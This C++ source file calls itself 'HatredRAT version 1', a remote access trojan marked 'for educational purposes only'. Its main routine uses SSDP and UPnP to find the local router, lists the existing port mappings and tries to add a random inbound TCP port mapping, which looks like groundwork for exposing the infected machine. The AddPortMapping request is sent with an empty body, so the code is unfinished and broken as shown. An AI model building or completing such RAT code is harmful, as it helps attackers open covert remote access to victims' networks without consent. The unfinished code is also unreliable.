// for educational purposes only

#include <charconv>
#include <list>
#include <random>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>

#include "./ssdp.h"
#include "./util.h"
#include "./upnp.h"
#include "./net.h"
#include "./http.h"
#include "./xml.h"

#define MAX_PORT 65535

#define IPV4_ADDR_STR_LEN 16

#define PROTO_INET 0

using namespace hatred;

void xml_print(xml::xml_node* node, int depth) {
    printf("%*s<%s%s", depth, "", node->pi ? "?" : "", node->name.c_str());
    
    for (auto [k, v] : node->attributes) printf(" %s=\"%s\"", k.c_str(), v.c_str());
    
    if (node->pi) {
        printf("?>\n");
        return;
    }

    if (node->leaf) {
        printf(">%s</%s>\n", node->value.c_str(), node->name.c_str());
        return;
    }

    if (node->children.size() == 0) {
        printf("/>\n");
        return;
    } 

    printf(">\n");

    for (auto i : node->children) {
        xml_print(&i, depth + 1);
    }

    printf("%*s</%s>\n", depth, "", node->name.c_str());
}

int main() {
    DPRINTF("HatredRAT version 1.\n"
            "FOR EDUCATIONAL PURPOSES ONLY.\n");

    DPRINTF("attempting to start server\n");

    DPRINTF("try upnp\n");

    int upnpsock = socket(AF_INET, SOCK_DGRAM, PROTO_INET);
    
    upnp::send_msearch_m(upnpsock, {
        .max_wait = 1,
        .search_target = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
    });

    ssdp::ssdp_message message = ssdp::ssdp_message();
    while (ssdp::recv_message(message, upnpsock, 100) >= 0) {
        if (message.header.contains("ST") && message.header["ST"] == "urn:schemas-upnp-org:device:InternetGatewayDevice:1") {
            for (const auto& [k, v] : message.header) {
                DPRINTF("GOT FIELD \"%s:%s\"\n", k.c_str(), v.c_str());
            }

            if (message.header.contains("LOCATION")) {
                std::string loc = message.header["LOCATION"];

                DPRINTF("REQUEST INFO FOR \"%s\"\n", loc.c_str());
                
                int httpsock = socket(AF_INET, SOCK_STREAM, PROTO_INET); // XXX: @xwashere WHAT THE FUCK SOCK_STREAM DOESNT FIX FIX NOW FUCK YOUY

                http::connect(httpsock, loc);

                if (http::send_message({
                    .url = loc,
                    .header = { 
                        {"CPFN.UPNP.ORG", "asfdasfd"}
                    }
                }, httpsock, 100) >= 0) {
                    http::http_message msg;
                    if (http::recv_message(msg, httpsock, 500) >= 0) {
                        DPRINTF("status: %i %s\n", msg.status, msg.status_reason.c_str());
                        for (const auto& [k, v] : msg.header) {
                            DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                        }
                        DPRINTF("=== body\n%s\n===\n", msg.body.c_str());

                        xml::xml_node* node = xml::parse_xml(msg.body);

                        if (node) {
                            xml_print(node, 0);

                            for (auto r1 : node->children) {
                                if (r1.name == "URLBase") {
                                    for (auto r2 : node->children) {
                                        if (r2.name == "device") {
                                            for (auto r3 : r2.children) {
                                                if (r3.name == "deviceList") {
                                                    for (auto r4 : r3.children) {
                                                        if (r4.name == "device") {
                                                            for (auto r5 : r4.children) {
                                                                if (r5.name == "deviceList") {
                                                                    for (auto r6 : r5.children) {
                                                                        if (r6.name == "device") {
                                                                            for (auto r7 : r6.children) {
                                                                                if (r7.name == "serviceList") {
                                                                                    for (auto r8 : r7.children) {
                                                                                        if (r8.name == "service") {
                                                                                            for (auto r9 : r8.children) {
                                                                                                if (r9.name == "serviceType") {
                                                                                                    if (r9.value == "urn:schemas-upnp-org:service:WANIPConnection:1") {
                                                                                                        for (auto r10 : r8.children) {
                                                                                                            if (r10.name == "controlURL") {
                                                                                                                std::string control = r1.value + r10.value;
                                                                                                                DPRINTF("control url: %s\n", control.c_str());

                                                                                                                char sip[sizeof("XXX.XXX.XXX.XXX")];

                                                                                                                sockaddr_in lip;
                                                                                                                socklen_t   llen = sizeof(lip);

                                                                                                                getsockname(httpsock, (sockaddr*)&lip, &llen);
                                                                                                                inet_ntop(AF_INET, &lip.sin_addr, sip, sizeof(sip));

                                                                                                                DPRINTF("local ip: %s\n", sip);

                                                                                                                std::string local_ip = sip;

                                                                                                                http::http_url nurl = http::parse_url(control);
                                                                                                                http::http_url ourl = http::parse_url(loc);

                                                                                                                if (!(nurl.host == ourl.host && nurl.port == ourl.port)) {
                                                                                                                    close(httpsock);
                                                                                                                    httpsock = socket(AF_INET, SOCK_STREAM, PROTO_INET);
                                                                                                                    http::connect(httpsock, control);
                                                                                                                }

                                                                                                                std::list<unsigned short> ports;
                                                                                                                int                       pcount = MAX_PORT;

                                                                                                                for (int i = 0; i < MAX_PORT; i++) {
                                                                                                                    ports.push_back(i + 1);
                                                                                                                }

                                                                                                                for (int i = 0; i < MAX_PORT; i++) {
                                                                                                                    if (http::send_message({
                                                                                                                        .method = "POST",
                                                                                                                        .url = control,
                                                                                                                        .header = {
                                                                                                                            {"CONTENT-TYPE",  "text/xml"},
                                                                                                                            {"SOAPACTION",    "\"urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry\""},
                                                                                                                        },
                                                                                                                        .body = 
                                                                                                                        "<?xml version=\"1.0\"?>\r\n"
                                                                                                                        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                                                                                                                            "<s:Body>"
                                                                                                                                "<u:GetGenericPortMappingEntry u:act=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
                                                                                                                                    "<NewPortMappingIndex>" + std::to_string(i) + "</NewPortMappingIndex>"
                                                                                                                                "</u:GetGenericPortMappingEntry>"
                                                                                                                            "</s:Body>"
                                                                                                                        "</s:Envelope>\r\n"
                                                                                                                    }, httpsock, 100) >= 0) {
                                                                                                                        http::http_message msg;
                                                                                                                        if (http::recv_message(msg, httpsock, 100) >= 0) {
                                                                                                                            //DPRINTF("status: %i %s\n", msg.status, msg.status_reason.c_str());
                                                                                                                            //for (const auto& [k, v] : msg.header) {
                                                                                                                            //    DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                                                                                                                            //}
                                                                                                                            //DPRINTF("=== body\n%s\n===\n", msg.body.c_str());

                                                                                                                            if (msg.status == 500) break;

                                                                                                                            xml::xml_node* resp = xml::parse_xml(msg.body);
                                                                                                                            
                                                                                                                            for (auto nd : resp->children[0].children[0].children) {
                                                                                                                                if (nd.name == "NewProtocol") {
                                                                                                                                    if (nd.value == "TCP") {     
                                                                                                                                        for (auto nd : resp->children[0].children[0].children) {
                                                                                                                                            if (nd.name == "NewExternalPort") {
                                                                                                                                                int p;
                                                                                                                                                
                                                                                                                                                std::from_chars(nd.value.c_str(), nd.value.c_str() + nd.value.length(), p);

                                                                                                                                                DPRINTF("port %i is already in use\n", p);

                                                                                                                                                ports.remove(p);
                                                                                                                                                pcount--;
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }

                                                                                                                std::random_device            rdev;
                                                                                                                std::mt19937                  ralg(rdev());
                                                                                                                std::uniform_int_distribution rprt(1, pcount);


                                                                                                                int i = rprt(ralg);
                                                                                                                
                                                                                                                for (auto port : ports) {
                                                                                                                    if (i == 1) {
                                                                                                                        printf("%i %i\n", i, port);
                                                                                                                        if (http::send_message({
                                                                                                                            .method = "POST",
                                                                                                                            .url = control,
                                                                                                                            .header = {
                                                                                                                                {"CONTENT-TYPE",  "text/xml"},
                                                                                                                                {"SOAPACTION",    "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\""},
                                                                                                                            },
                                                                                                                            .body = 
                                                                                                                            "<?xml version=\"1.0\"?>\r\n"
                                                                                                                            "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                                                                                                                                "<s:Body>"
                                                                                                                                    "<u:AddPortMapping u:act=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
                                                                                                                                        
                                                                                                                                    "</u:AddPortMapping>"
                                                                                                                                "</s:Body>"
                                                                                                                            "</s:Envelope>\r\n"
                                                                                                                        }, httpsock, 100) >= 0) {
                                                                                                                            http::http_message msg;
                                                                                                                            if (http::recv_message(msg, httpsock, 100) >= 0) {
                                                                                                                                DPRINTF("status: %i %s\n", msg.status, msg.status_reason.c_str());
                                                                                                                                for (const auto& [k, v] : msg.header) {
                                                                                                                                    DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                                                                                                                                }
                                                                                                                                DPRINTF("=== body\n%s\n===\n", msg.body.c_str());
                                                                                                                            }
                                                                                                                        }
                                                                                                                        break;
                                                                                                                    } else i--;
                                                                                                                };
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    DPRINTF("failed to get igd info");
                }
            }
        }

        message = ssdp::ssdp_message();
    }

    return 0;
}